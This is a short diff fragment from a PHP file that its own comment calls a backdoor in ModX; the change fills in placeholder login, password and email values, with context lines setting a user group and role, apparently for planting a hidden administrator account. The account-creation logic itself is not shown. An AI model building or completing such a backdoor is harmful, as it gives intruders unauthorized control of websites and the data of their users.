@@ -4,9 +4,9 @@
  * It`s backdoor in ModX
  */
 
- $username = '';    // Login
- $password = '';    // Password
- $email = '';       // Email
+ $username = '<YOUR_LOGIN>';       // Login
+ $password = '<YOUR_PASSWORD>';    // Password
+ $email = '<YOUR_EMAIL>';          // Email
 
  $usergroup = 1;
  $user_role = 2;
